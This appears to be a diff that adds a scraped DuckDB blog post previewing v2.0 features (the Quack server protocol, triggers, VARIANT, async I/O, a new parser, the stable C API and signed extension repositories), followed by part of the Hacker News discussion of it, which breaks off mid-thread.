@@ -1,0 +1,5929 @@
+
+=== duckdb https://duckdb.org/2026/08/17/duckdb-20-highlights ===
+A Preview of DuckDB v2.0 – DuckDB
+Documentation
+Getting Started
+Installation
+Quack Remote Protocol
+Guides
+Data Import
+Client APIs
+SQL Introduction
+Why DuckDB
+Resources
+Blog
+Library
+Events
+Everywhere
+Webshop
+Design
+FAQ
+GitHub
+40.3k
+Support
+Support
+A Preview of DuckDB v2.0
+Mark Raasveldt and Hannes Mühleisen
+2026-08-17
+|
+15 min
+TL;DR: DuckDB v2.0 is coming this fall. In this post, we preview its headline features: DuckDB as a server, triggers, the VARIANT type, asynchronous I/O, a new SQL parser, a new storage format, and much more.
+DuckDB v2.0 will be named “Cyanoptera” after the
+cinnamon teal
+(Anas cyanoptera),
+a strikingly reddish-brown duck found in the western Americas.
+A major version bump is not something we do lightly, and it is not just ceremony: v2.0 ships a new SQL parser, a new default storage format, a reworked C API, and a small number of carefully chosen breaking changes. But above all, it is a feature release, built from over 10,000 commits since we released v1.5 in March. Where last year was the year of the lakehouse, this release kicks off the year of DuckDB as a server. We previewed many of these features in the
+“State of the Duck” talk at DuckCon #7
+, if you prefer to watch instead of read.
+DuckDB is moving rather quickly, and we can only cover a small fraction of the changes here. Condensing all new features down to a shortlist is always a fight over what gets in, and yes, we know that what follows is technically a listicle
+(Ten Things Coming to DuckDB v2.0, Number Eight Will Shock You).
+We are not proud of the format, but it works, so here it is, starting with the SQL-level features and working down into the engine.
+1. DuckDB as a Server: Quack and
+CONNECT
+DuckDB has been an in-process database since day one. But people have asked us – very persistently – for a client/server mode, and we have finally caved. The
+quack
+extension
+implements DuckDB's native protocol for talking to other DuckDBs. It was
+released as a preview
+shortly before DuckCon #7, graduates to stable in v2.0, and it is a big part of where DuckDB is headed: any DuckDB process can serve its databases over the network, and any other DuckDB can attach to it and route queries there using the new
+CONNECT
+statement. For example:
+DuckDB server
+CALL
+quack_serve
+(
+token
+=
+'my_token'
+);
+quack:
+DuckDB client
+ATTACH
+'quack:server.example.com'
+AS
+qk
+(
+TOKEN
+'my_token'
+);
+CONNECT
+qk
+;
+SELECT
+count
+(
+*
+)
+FROM
+events
+;
+-- executes on the server,
+-- results stream back
+DISCONNECT
+;
+CONNECT
+is the successor to the
+remote.query($$...$$)
+workaround we showed when Quack was first revealed – we looked at that syntax and said: no, this cannot be it. And
+CONNECT
+is not limited to Quack: it points your session at any remote database that supports it, and the new remote pushdown optimizer (
+#22914
+) ships SQL directly to PostgreSQL and MySQL instead of pulling tables over the wire:
+CONNECT
+'postgres://localhost/mydb'
+;
+SELECT
+count
+(
+*
+)
+FROM
+orders
+;
+-- runs on the PostgreSQL server
+DISCONNECT
+;
+If you have worked with analytical systems in the past, you may assume that DuckDB cannot handle transactional workloads. But DuckDB has been built as a transactional, multi-connection database with full MVCC and transaction isolation since day one. Most users just never needed that in a single-user scenario. It turns out DuckDB handles transactions well: it's fast enough to compete with general-purpose databases like PostgreSQL on quite a few workloads, and the client/server pattern finally lets that machinery shine in multi-tenant, long-running deployments.
+Running DuckDB long-term also comes with new challenges, which is why v2.0 pushes on better metrics, logs, and observability (see, e.g., the metrics layer rework in
+#22799
+) that let you look at a DuckDB instance and see what it is actually doing. People even built standalone clients for the Quack protocol within weeks of the preview. We thought we were extending DuckDB to talk to other DuckDBs; the world said no, no, no, and built their own clients. Who would have thought.
+2.
+VARIANT
+Becomes a First-Class Citizen
+The
+VARIANT
+type shipped in
+DuckDB v1.5
+, and the way to think about it is JSON on steroids. Basically, imagine if JSON were fast. Like JSON, a
+VARIANT
+column can store differently-shaped data in every row. Unlike JSON, it is not a text format: DuckDB automatically detects the common structure hidden in your semi-structured data and “shreds” it, so it compresses well in storage and executes fast in queries, all without you ever declaring a schema. This makes
+VARIANT
+a natural fit for real-time log ingestion, where streams of JSON-ish records share structure but evolve over time.
+In v2.0, this pipeline works end to end: shredded execution straight from storage (
+#20912
+), extraction pushdown into scans (
+#22478
+), shredded
+VARIANT
+reading
+and
+writing for Parquet, and a family of
+variant_*
+functions:
+CREATE
+TABLE
+events
+(
+payload
+VARIANT
+);
+INSERT
+INTO
+events
+VALUES
+(
+'{"user": {"id": 42, "tags": ["a", "b"]}}'
+::
+JSON
+::
+VARIANT
+);
+SELECT
+variant_type
+(
+payload
+),
+variant_keys
+(
+payload
+)
+FROM
+events
+;
+SELECT
+*
+FROM
+events
+WHERE
+variant_contains
+(
+payload
+,
+{
+'user'
+:
+{
+'id'
+:
+42
+}}::
+VARIANT
+);
+Longer term, likely soon after v2.0 (but don't hold us to it), we plan to back the regular
+JSON
+type with
+VARIANT
+, so existing JSON workloads get all of these benefits without changing a single query.
+3. Triggers
+Triggers have been a long-standing feature request, and DuckDB v2.0 delivers them in full:
+BEFORE
+and
+AFTER
+triggers,
+FOR EACH ROW
+and
+FOR EACH STATEMENT
+, transition tables via
+REFERENCING OLD/NEW TABLE
+, multiple triggers per event,
+RETURNING
+on triggered tables, and
+DROP TRIGGER
+.
+The classic use case is audit tables: something happens in the system, and a trigger records what changed. For example:
+CREATE
+TABLE
+target
+(
+id
+INTEGER
+,
+val
+INTEGER
+);
+CREATE
+TABLE
+audit
+(
+id
+INTEGER
+,
+old_val
+INTEGER
+,
+new_val
+INTEGER
+);
+CREATE
+TRIGGER
+trg_audit
+AFTER
+UPDATE
+ON
+target
+REFERENCING
+OLD
+TABLE
+AS
+o
+NEW
+TABLE
+AS
+n
+FOR
+EACH
+STATEMENT
+INSERT
+INTO
+audit
+SELECT
+n.id
+,
+o.val
+,
+n.val
+FROM
+o
+JOIN
+n
+ON
+o.id
+=
+n.id
+;
+INSERT
+INTO
+target
+VALUES
+(
+1
+,
+10
+),
+(
+2
+,
+20
+);
+UPDATE
+target
+SET
+val
+=
+val
+*
+10
+WHERE
+id
+<=
+2
+;
+SELECT
+*
+FROM
+audit
+;
+id
+old_val
+new_val
+1
+10
+100
+2
+20
+200
+Triggers fit naturally with long-running DuckDB services, and we are also planning to use them internally to build several upcoming features. They are fully exposed at the SQL level too, so you can build your own cool stuff with them.
+4. SQL Dialect Additions
+As always, DuckDB's SQL dialect keeps growing. A few favorites from this release cycle:
+With
+NEAREST
+joins
+(
+#24137
+), top-k similarity search becomes a join clause, handy for vector and embedding workloads:
+SELECT
+q.user_id
+,
+t.product_id
+FROM
+users
+q
+INNER
+JOIN
+products
+t
+APPROX
+NEAREST
+2
+BY
+SIMILARITY
+array_cosine_similarity
+(
+q.embedding
+,
+t.embedding
+);
+DML inside CTEs
+(
+#21634
+,
+#21997
+,
+#24217
+) lets you use
+INSERT
+,
+UPDATE
+,
+DELETE
+, and
+COPY
+as pipeline steps:
+WITH
+moved
+AS
+MATERIALIZED
+(
+DELETE
+FROM
+staging
+RETURNING
+*
+)
+INSERT
+INTO
+archive
+SELECT
+*
+FROM
+moved
+;
+Nested schemas
+(
+#23492
+,
+#24222
+) allow schemas within schemas:
+CREATE
+SCHEMA
+finance
+;
+CREATE
+SCHEMA
+finance.reports
+;
+CREATE
+TABLE
+finance.reports.q3
+(
+revenue
+DECIMAL
+);
+The new
+variable syntax
+(
+#21194
+) lets you write
+$x
+anywhere an expression is allowed, no more
+getvariable(...)
+verbiage
+:
+SET
+VARIABLE
+threshold
+=
+100
+;
+SELECT
+*
+FROM
+orders
+WHERE
+amount
+>
+$
+threshold
+;
+The
+JSON mutation functions
+json_set
+,
+json_insert
+,
+json_replace
+, and
+json_remove
+(
+#23786
+) finally let you modify JSON documents in place:
+SELECT
+json_set
+(
+'{"a":1}'
+,
+'$.b'
+,
+'2'
+);
+json_set('{"a":1}', '$.b', '2')
+{"a":1,"b":2}
+And
+recursive CTEs with
+USING KEY
+aggregation
+(
+#19481
+) enable iterative algorithms in pure SQL, backed by the rewritten recursive CTE engine described below:
+WITH
+RECURSIVE
+tbl
+(
+a
+,
+b
+)
+USING
+KEY
+(
+a
+,
+avg
+(
+b
+))
+AS
+(
+SELECT
+1
+,
+5
+UNION
+SELECT
+a
+,
+b
+-
+1
+FROM
+tbl
+WHERE
+b
+>
+0
+)
+TABLE
+tbl
+;
+a
+b
+1
+2.5
+There is more: SQL-standard
+FETCH FIRST 2 ROWS ONLY
+(
+#23533
+),
+OVERLAY()
+(
+#22456
+),
+UNNEST
+in
+GROUP BY
+(
+#23644
+), and well-defined
+MERGE
+/
+UPDATE ... FROM
+semantics for multi-matched rows (
+#24058
+).
+5. Asynchronous I/O
+Interacting with object stores like S3 is central to the DuckDB experience: your data has to come from somewhere, and it often sits in object storage. DuckDB has long been able to read from object stores in parallel, but synchronous access placed a limit on how fast this could go. DuckDB v2.0 introduces asynchronous I/O throughout the engine. We described the design in detail in
+a dedicated blog post
+.
+Thanks to asynchronous access, the I/O layer now scales independently from the query processing layer, which means far more parallelism for remote reads and dramatically faster queries on network storage. Parquet support came first (
+#23662
+), with CSV (
+#23961
+) and DuckDB's own file format (
+#24654
+) following, along with asynchronous Parquet writes (
+#23283
+) and new
+MMAP
+and
+DIRECT_IO
+modes (
+#22988
+). Local storage benefits a little too, but network storage is where you will see the big gains.
+6. Faster Queries Across the Board
+As with every release, a lot of work went into making your existing queries faster without you doing anything. To pick some highlights: partial aggregates are now pushed below joins (
+#22572
+) and redundant aggregations are reused (
+#24543
+), the recursive CTE engine has been rewritten (
+#22211
+), aggregations now spill to disk when they outgrow memory (
+#24499
+), and the Windows CLI got approximately 2.2× faster at multi-threaded result materialization (
+#24036
+).
+How much faster can this get? Here is a microbenchmark you can run on a laptop: single-source reachability over a graph with one million edges, written as a plain
+recursive CTE
+.
+CREATE
+TABLE
+edges
+AS
+SELECT
+(
+range
+%
+100_000
+)::
+INTEGER
+AS
+src
+,
+((
+range
+*
+13
++
+7
+)
+%
+100_000
+)::
+INTEGER
+AS
+dst
+FROM
+range
+(
+1_000_000
+);
+WITH
+RECURSIVE
+reachable
+(
+node
+)
+AS
+(
+SELECT
+0
+UNION
+SELECT
+dst
+FROM
+edges
+,
+reachable
+WHERE
+src
+=
+node
+)
+SELECT
+count
+(
+*
+)
+FROM
+reachable
+;
+Version
+Run time
+DuckDB v1.5.4
+4.90 s
+DuckDB v2.0 (preview)
+0.12 s
+As you can see, DuckDB v2.0 is about 40× faster (!) for the same recursive query.
+Row-group pruning has been massively expanded:
+min-max indexes (zone maps)
+and
+Parquet Bloom filters
+now skip data for structs, lists, decimals, UUIDs,
+IN
+filters, and even function predicates:
+-- these now prune row groups instead of scanning them:
+SELECT
+*
+FROM
+logs
+WHERE
+contains
+(
+message
+,
+'ERROR'
+);
+SELECT
+*
+FROM
+t
+WHERE
+substr
+(
+code
+,
+1
+,
+3
+)
+=
+'NL-'
+;
+SELECT
+*
+FROM
+'data/*.parquet'
+WHERE
+id
+IN
+(
+1
+,
+5
+,
+9
+);
+Query planning also becomes
+partition-aware
+(
+#22336
+).
+Lakehouse formats
+(DuckLake, Iceberg and plain Hive-partitioned Parquet on S3) are all partitioned, and exploiting that partitioning is often the difference between scanning a dataset and skipping most of it. In v2.0, the planner and optimizer take full advantage of existing partitioning, and partitioned writes have been reworked as well (
+#22225
+,
+#22620
+).
+7. Storage Format v2.0
+DuckDB v2.0 bumps the default
+storage format version
+to v2.0.0 (
+#22875
+). The headline change is buffer-managed ART indexes (
+#21458
+,
+#23605
+): indexes are no longer pinned in memory, which means large indexed tables open instantly and their indexes are paged in on demand.
+Column metadata is now loaded lazily (
+#22333
+), so wide tables open faster too. The
+DICT_FSST
+string compression method is enabled by default (
+#23733
+), deletes are stored compactly (
+#24336
+), and the storage layer performs much stronger corruption validation on read. In short: databases with big indexes and wide tables open faster and use far less memory.
+8. A Brand New SQL Parser
+DuckDB has famously always used a parser derived from PostgreSQL's. We have decided that enough is enough: v2.0 ships our own modern, extensible PEG-based parser (
+#22194
+), an idea we first explored in our 2024 post on
+runtime-extensible parsers
+. This change ties into the extension ecosystem: extensions can now hook into the grammar itself, so expect extensions that expose entirely new SQL syntax. It also brings better error messages with precise source locations, and the first dialect compatibility mode:
+SET
+dialect_compatibility_mode
+=
+'spark'
+;
+You should not actually notice anything from the parser swap as we designed it to be compatible with the old one. If you do notice, please file an issue.
+9. Timezones, Calendars, and Collations Without ICU
+Timezone-aware timestamps, calendars, and collations in DuckDB have always been powered by the ICU library. ICU is a fine library, but we only ever used a small slice of it, while still carrying it around in every DuckDB distribution. In v2.0, the ICU library is gone entirely: the
+icu
+extension now implements timezones, calendars, and collations itself (
+#24463
+,
+#24403
+), with the timezone data built directly from the IANA database and compressed down to around 45 kB. Everything keeps working exactly as before:
+SELECT
+'2026-08-14 12:00:00'
+::
+TIMESTAMPTZ
+AT
+TIME
+ZONE
+'Europe/Paris'
+;
+SELECT
+*
+FROM
+names
+ORDER
+BY
+name
+COLLATE
+de
+;
+Besides being much smaller and easier to keep up to date, the new implementation is also simply faster. Here's a quick microbenchmark on a MacBook that converts 25 million timestamps to a timezone and filters 5 million strings with a German collation:
+Query
+v1.5.4 (ICU)
+v2.0 (native)
+Speedup
+ts AT TIME ZONE 'Europe/Paris'
+, 25 M rows
+0.24 s
+0.11 s
+2.2×
+Filter with
+COLLATE de
+, 5 M rows
+0.15 s
+0.06 s
+2.6×
+10. Write Extensions Once, Host Them Yourself
+Extensions are one of the best things about DuckDB, but today, most of them, including our own, build against the
+unstable C++ API
+. That means extension authors have to re-target and rebuild for every DuckDB release, and community extensions can silently disappear when their authors stop keeping up. DuckDB v2.0 broadens the
+stable
+C API far enough that extensions can be written once, built once, published once, and keep working, essentially until the end of time.
+To make this sustainable over the long run, the C API is now generated from a declarative, versioned specification (
+#24135
+): every function in
+duckdb.h
+,
+duckdb_extension.h
+, and the extension ABI is described in YAML in the
+api_spec/
+directory
+, with its full lifecycle on record, and CI verifies the committed headers against the spec so API and ABI can no longer drift apart. The release also brings unified symbol versioning (
+#24435
+), custom allocation handlers (
+#23945
+), and static linking of C API extensions into your application (
+#22251
+).
+So what does building an extension against the stable C API look like? Here is a complete extension: a single file that registers a vectorized scalar function, compiled once against
+duckdb_extension.h
+.
+#include
+"duckdb_extension.h"
+DUCKDB_EXTENSION_EXTERN
+// a scalar function that adds two BIGINTs, one vector at a time
+static
+void
+AddNumbers
+(
+duckdb_function_info
+info
+,
+duckdb_data_chunk
+input
+,
+duckdb_vector
+output
+)
+{
+idx_t
+count
+=
+duckdb_data_chunk_get_size
+(
+input
+);
+int64_t
+*
+a
+=
+(
+int64_t
+*
+)
+duckdb_vector_get_data
+(
+duckdb_data_chunk_get_vector
+(
+input
+,
+0
+));
+int64_t
+*
+b
+=
+(
+int64_t
+*
+)
+duckdb_vector_get_data
+(
+duckdb_data_chunk_get_vector
+(
+input
+,
+1
+));
+int64_t
+*
+result
+=
+(
+int64_t
+*
+)
+duckdb_vector_get_data
+(
+output
+);
+for
+(
+idx_t
+row
+=
+0
+;
+row
+<
+count
+;
+row
+++
+)
+{
+result
+[
+row
+]
+=
+a
+[
+row
+]
++
+b
+[
+row
+];
+}
+}
+DUCKDB_EXTENSION_ENTRYPOINT
+(
+duckdb_connection
+con
+,
+duckdb_extension_info
+info
+,
+duckdb_extension_access
+*
+access
+)
+{
+duckdb_scalar_function
+f
+=
+duckdb_create_scalar_function
+();
+duckdb_scalar_function_set_name
+(
+f
+,
+"add_numbers"
+);
+duckdb_logical_type
+bigint
+=
+duckdb_create_logical_type
+(
+DUCKDB_TYPE_BIGINT
+);
+duckdb_scalar_function_add_parameter
+(
+f
+,
+bigint
+);
+duckdb_scalar_function_add_parameter
+(
+f
+,
+bigint
+);
+duckdb_scalar_function_set_return_type
+(
+f
+,
+bigint
+);
+duckdb_destroy_logical_type
+(
+&
+bigint
+);
+duckdb_scalar_function_set_function
+(
+f
+,
+AddNumbers
+);
+duckdb_register_scalar_function
+(
+con
+,
+f
+);
+duckdb_destroy_scalar_function
+(
+&
+f
+);
+return
+true
+;
+}
+LOAD
+add_numbers
+;
+SELECT
+add_numbers
+(
+40
+,
+2
+);
+For brevity, we skipped
+NULL
+handling here. See the
+demo_capi
+extension
+for the full version.
+The binary this compiles to keeps working across DuckDB versions. You do not need re-target or rebuild it every time a new DuckDB version comes out. And nowadays, with all the AI tooling around, building an extension has never been easier.
+So you have written your extension. But how should you distribute it? Until now, DuckDB could only install extensions from the built-in repositories (
+core
+,
+core_nightly
+,
+community
+, …). In v2.0, you will be able to register your own trusted repositories (
+#24777
+, currently work-in-progress), so an organization can host and sign its own extensions and have them install and load just like the built-in ones:
+SET
+allow_extension_repositories
+=
+'allowed'
+;
+CREATE
+EXTENSION
+REPOSITORY
+my_repo
+FROM
+'https://extensions.example.org'
+;
+INSTALL
+my_ext
+FROM
+my_repo
+;
+LOAD
+my_repo
+/
+my_ext
+;
+A repository is a name, a URL prefix, and one or more RSA public keys that are trusted to sign the extensions served from it. The prefix can point at anything DuckDB can read: a local path,
+https
+,
+s3
+, you name it. At
+CREATE
+time, DuckDB fetches the repository's public keys and pins them into the repository definition, printing each key's SHA-256 fingerprint so you can compare it against one published out of band. If you would rather not trust the network at all, you can pass the key directly:
+CREATE
+EXTENSION
+REPOSITORY
+my_repo
+FROM
+'s3://my-bucket/extensions'
+USING
+PUBLIC
+KEY
+'-----BEGIN PUBLIC KEY----- ...'
+;
+Pinned repositories survive restarts, support key rotation by trusting multiple keys, and can be audited at any time through the
+duckdb_extension_repositories()
+table function, or removed again with
+DROP EXTENSION REPOSITORY
+. Together with the stable C API, the extension story rounds out nicely: write your extension once, sign it, host it wherever you like, and
+INSTALL
+it anywhere.
+Bonus: DuckDB Foundation – Advisory Board
+Starting this fall, we will add a stakeholder advisory board to the
+DuckDB Foundation
+. The advisory board will provide input on the development roadmap of DuckDB, DuckLake, and Quack. This allows key stakeholders to have a say in the projects' direction.
+Final Thoughts
+These are only a few highlights, and this post is only a preview. Some details may still shift before the release this fall, and there are many more features and improvements that we could not cover here. DuckDB v2.0 will also come with a small set of breaking changes, including the new default storage format and the completed lambda syntax transition, which we will cover in detail in the release announcement.
+There have been more than 10,000 commits by many contributors since we released v1.5. We would like to thank our community for the detailed issue reports, feedback, and contributions that shaped this release. If you want a taste before the fall, the
+preview builds
+have most of these features today, and if something breaks, you know where
+the issue tracker
+is.
+In this article
+1. DuckDB as a Server: Quack and CONNECT
+2. VARIANT Becomes a First-Class Citizen
+3. Triggers
+4. SQL Dialect Additions
+5. Asynchronous I/O
+6. Faster Queries Across the Board
+7. Storage Format v2.0
+8. A Brand New SQL Parser
+9. Timezones, Calendars, and Collations Without ICU
+10. Write Extensions Once, Host Them Yourself
+Bonus: DuckDB Foundation – Advisory Board
+Final Thoughts
+Recent Posts
+Thank You for 40 000 Stars on GitHub
+2026-08-05
+4 min
+The DuckDB team
+Asynchronous I/O in DuckDB: Work, Thread, Work
+2026-07-31
+21 min
+Pedro Holanda
+Announcing DuckDB 1.5.5
+2026-07-22
+2 min
+The DuckDB team
+All blog posts
+DuckDB is an open-source project by
+DuckLabs
+.
+Documentation
+Getting started
+Installation
+Guides
+Data import
+Client APIs
+SQL introduction
+Quack documentation
+Why DuckDB
+Resources
+Engineering blog
+Library
+Quack introduction
+Events
+Webshop
+RSS feed
+Status page
+FAQ
+Development
+Release calendar
+Roadmap
+Building DuckDB
+GitHub issues
+Related Sites
+DuckLake
+DuckLabs
+DuckDB Foundation
+Commercial support
+Community
+Community Extensions
+LinkedIn
+Bluesky
+X (Twitter)
+Discord
+© 2026 DuckDB Foundation, Amsterdam NL
+Code of Conduct
+Trademark Use
+
+=== hn-duckdb https://news.ycombinator.com/item?id=49330781 ===
+A Preview of DuckDB v2.0 | Hacker News
+Hacker News
+new
+|
+past
+|
+comments
+|
+ask
+|
+show
+|
+jobs
+|
+submit
+login
+A Preview of DuckDB v2.0
+(
+duckdb.org
+)
+619 points
+by
+ibotty
+18 hours ago
+|
+hide
+|
+past
+|
+favorite
+|
+112 comments
+help
+otter-in-a-suit
+15 hours ago
+|
+next
+[–]
+Super excited about Quack (partially due to the name). I use duckdb for both analytics and runtime, but I do have to serve/handle/manage a giant, multi-GiB duckdb file as effectively a runtime artifact[1]. I'm aware that this isn't the _perfect_ database for this, but the mix of it being fast, having spatial support, sane coding interfaces, great dbt integration, and me being able to do everything between "run a giant several hundred step dbt pipeline" to "query the output of said pipeline" to "read/query a csv on disk" with the exact same tool is just so nice. If I could centrally manage said asset more akin to a traditional database, I'd be very happy.
+I've partially solved this with separate databases for different steps in the data pipeline(s) and have even experimented with Clickhouse as a complete alternative, but I really like way too many things about duckdb to replace it.
+[1]: If you care:
+https://skaldmaps.com/blog/2026/07/zip-codes-are-a-bad-spati...
+reply
+mediaman
+15 hours ago
+|
+parent
+|
+next
+[–]
+I built a platform for some midsize companies in a specific vertical that is basically a data warehouse with some LLM-driven dashboarding and query tools on top. Typical data size 5-150gb. So I built a service layer around duckdb, where each tenant gets their own duckdb. I'm also in the boat of knowing that duckdb is not the perfect solution for this (the classic use case is running it against local data on a laptop), but there's so much I like about it, and it's really nice that each tenant can have total separation with custom schemas and that it's straightforward to pile data into object storage and form your own lake.
+And now with things like quack the sharp points around concurrency are relaxing, and it feels like the compromises of using it this way are disappearing.
+reply
+allan_s
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+As somebody new to this and with a use case very similar to yours , what would have been a more suitable solution for this ?
+The guy who first built the architecture made the same decision as yours (I.e one local duckdb for each tenant to work as a copy of big query/their data warehouse) and I dont know what the state of the art for this kind of use cases ?
+reply
+otter-in-a-suit
+7 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+There's a few options.
+Clickhouse, as I mentioned, can be a good final layer, as can postgres.
+You can still use duckdb for intermediate transformations, even if the final data lives elsewhere.
+duckdb can also access various external sources, such as s3, so you could use duckdb for transformations and write "classic" parquet files to S3 and query them with an engine of your choice (which, again, could also be duckdb, but nothing stopping you from using Trino or something along those lines).
+All a question of scale, complexity, cost, and latency. For reasonably low latency, shipping a duckdb file to the edge is fine, I think. Makes CI/deployments more complicated. Or you could assemble the actual duckdb file on site - probably easier with K8s and an init container that can scale? Something like that, I don't use K8s for SkaldMaps, but I have experimented a bit.
+For SkaldMaps, the backend is written in go and has an abstraction to plug in a different presentation data store, so I would just need to re-wire data platform to write the final tables to e.g. CH instead of duckdb.
+reply
+mediaman
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Clickhouse has a more intentionally built ingestion system. Duckdb has concurrency limits so you can't have a writer and a reader on the same file if they're not the same process (multiple readers is fine).
+But that's not too hard to work around. You can either have a single process that owns both writing and reading that file, or you can do a data lake where you post updates as parquet files into object storage, and duckdb handles the catalog. The Quack protocol also basically fixes this (though still in beta).
+With Clickhouse, you can of course still have tenant separation, but you have to do it by managing users within Clickhouse that map to users/tenants of your main app, so that you can restrict SQL access by tenant to only their data store. Not a huge deal but I just like the Unix "it's just a file" simplicity of "Tenant A gets to run arbitrary SQL against their separate read-only, no-ATTACH duckdb file".
+reply
+jamesblonde
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+DuckDB's sweet spot is for 'smallish' lakehouses. So, ingestion should not be via duckdb, but rather something like Python/DLTHub for small scale or Spark for large scale or Kafka/Debezium/Flink for streaming data.
+reply
+MatthausK
+4 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The CEO/Co-Founder of dltHub/dlt here.
+For our community DuckDB is the default data warehouse for local development environment. Last month +90,000 users used dlt (and their AI code editor) to load data into DuckDB.
+Because of our proximity to the DuckDB community we are seeing enterprise DuckDB usage first hand. People imo sleep on the data volumes DuckDB can handle. We see Fortune 100 companies use dlt and DuckDB in production on their Lakehouses in hybrid cloud deployments. I can eg mention Stellantis (Chrysler, Jeep, Peugeot etc) because they talk about it publicly.
+reply
+boc
+9 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Ducklake supports postgres for the catalog, so you get the postgres concurrency benefits + duckdb engine to read the parquet files in the bucket.
+reply
+8note
+8 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+another variant:
+i put duckdb on a lambda and pointed it at s3 for the data. my data was closer to 2GB but the queries were quick and nearly free with superset pointed at it
+is your setup running into problems that makes you need something more?
+reply
+smw
+5 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+2GB is so tiny it's almost irrelevant when talking about analytics?
+reply
+tccole
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I feel like familiarity and  ease of use and “good enough” beat out the perfect db for the job in many occasions.
+reply
+dmix
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+>  to "read/query a csv on disk"
+I discovered DuckDB looking for a way to analyze Nginx access.log's and it's an amazing tool. I believe it should be a standard tool like ripgrep for devs.
+reply
+grvdrm
+6 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Nice post and you have me checking out your broader site and product!
+reply
+ignaciovdk
+14 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Check it out Arc, I think that we can help there, plus, use DuckDB as a engine:
+https://github.com/Basekick-Labs/arc
+reply
+paoliniluis
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Hey this is neat and I just found out you're from BA, Argentina. I would love you be part of dataengine.ar and maybe talk about arc?
+reply
+ignaciovdk
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Hey hey. I love to. I'm from Argentina, and I say that Arc is proudly make from Latam, but I live in Costa Rica.
+reply
+rubenfiszel
+13 minutes ago
+|
+prev
+|
+next
+[–]
+We have bet early on DuckDB and Ducklake for Windmill and couldn't be happier. The focus on server/client mode is interesting, it opens the way for orchestrators like ours to have "lite" workers/jobs for duckdb that connect to one central bigger beefy nodes and improve the overall efficieny. I'm very curious if benchmark shows that there are performance benefits to do so thanks to co-location and overall less cpu cycles wastes.
+reply
+jtbaker
+17 hours ago
+|
+prev
+|
+next
+[–]
+DuckDB is one of the things I've been most excited about in a long time. Introduced it to projects at 3 companies since 2023, greatly lowering resource requirements and running it in a variety of environments. Just having the ability to do out of core bigger than memory data processing on lower end consumer grade hardware is remarkable.
+Thanks to the team for everything!
+reply
+throwaw12
+17 hours ago
+|
+parent
+|
+next
+[–]
+Curious to learn more about how people are using it?
+Are they downloading parquet files and running analyses locally, or are they connecting to Iceberg-like data lake and leveraging DuckDBs query engine capabilities or have you exposed an interface (REST, UI) to query your data?
+reply
+arealaccount
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+We use DuckDB WASM with parquet to build dashboards in-browser.  It's cool to be able to write SQL directly in a browser and not have to rely on REST/Graphql/etc to access the data layer.
+reply
+jayct
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+curious if you're using something mostly-out-of-the-box to layer on visualizations for your dashboards?
+relatively new to duckdb, love it so far, looking at alternatives for downstream visualization. so far just exporting datasets and piping into python scripts.
+reply
+jtbaker
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+For a schema-first (vs. code first) approach (which I think would be a sweet spot for agent driven dashboarding), I'd suggest looking at
+https://vega.github.io/vega-lite/
+or
+https://vega.github.io/vega/
+. A little higher level than full D3 but gives you a little higher level approach.
+reply
+mediaman
+13 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I do something similar and just use echarts. Very happy with it.
+reply
+AlfeG
+2 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Realtime full MSSQL database mirroring into DuckDb to do a complex reporting. Everything is in-process. DuckDb database mapped to temp storage and recreated on app restart. Still order of magnitude faster then doing a direct query over MSSQL Server (2ms vs 40+ seconds on same query).
+Some devs in team still cannot believe that there is no cheating, that it's possibe, that some 60Mb DB can do queries faster then MSSQL Server with just around 250Mb+ of memory overhead.
+(.Net 10 + DuckDB.NET package)
+reply
+jtbaker
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I've got a couple of different use cases:
+- ETL pipelines running on K8s nodes. Using their streaming processing engine means I can run smaller pods/nodes if needed, for datasets that may have required large dataframe-like transformations that may have buffered a big dataset into memory previously.
+- A CLI distributed to an internal team to do a postprocessing step on a large modeling dataset - to get it into a consumable format and upload it to a bucket as a .db file.
+- A SvelteKit app that used the node duckdb bindings to attach to the .db on the bucket and explore the results through a suite of BI tools. These tables have millions of rows, and would be pretty heavy to store in PG. The DuckDB version works really, really well.
+reply
+staticautomatic
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Similar here. Lots of places where we replaced Pandas with DuckDB for transformations. Also have scriptable custom dashboards running on top of BigQuery data pre-aggregated and extracted to parquet on GCS. It's way faster and the only limiting factor is your viz library. It was pretty easy to build and the only big gotcha I encountered was finding, somewhat counter-intuitively, that it's often best minimize partitioning.
+reply
+jtbaker
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> the only big gotcha I encountered was finding, somewhat counter-intuitively, that it's often best minimize partitioning.
+For parquet, I think with partitioning, it's really important to be mindful of the ordering of the data within the parquet file and also the query patterns of the main use cases. A little hard to generalize well to every pattern I guess.
+reply
+tccole
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Hell yeah; a fellow sveltekit fan.
+reply
+drums8787
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+We use WASM DuckDB as the target for an in-browser agentic feature. Generated SQL runs against the user's individual tables that then feed in-browser dashboards.
+Excellent performance.
+reply
+throw1234567891
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[2 more]
+[flagged]
+fg137
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Running duckdb as wasm in browser for dashboards is a very common use case.
+Does that make this account an alias as well?
+reply
+phqb
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
